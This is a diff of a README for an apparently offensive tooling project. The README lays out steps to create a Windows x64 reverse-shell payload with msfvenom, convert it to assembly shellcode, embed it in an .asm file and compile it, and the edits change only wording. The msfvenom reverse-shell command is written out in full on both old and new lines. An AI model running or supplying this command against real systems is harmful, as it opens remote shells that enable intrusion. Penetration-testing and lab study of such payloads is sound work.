@@ -2,13 +2,13 @@
 
 ## 1. Create your payload
 
-ex with : 
+For example with : 
 
-```msfvenom -p windows/x64/shell_reverse_tcp RHOST=192.168.245.132 LPORT=4444 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c > shellnew ```
+```msfvenom -p windows/x64/shell_reverse_tcp RHOST=192.168.245.132 LPORT=4444 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c ```
 
 ## 2. Convert your shellcode
 
-Use this [converter](./convert.sh)
+Use this homemade [converter](./convert.sh) to get your asm shellcode.
 
 
 ## 3. Put your shellcode in your .asm code
@@ -22,7 +22,7 @@ Use this [converter](./convert.sh)
 endshellcode DB 0
 ```
 
-See this example of [ASM File](./example.asm)
+See this example of [ASM File](./example.asm).
 
 ## 4. Compile your ASM
 
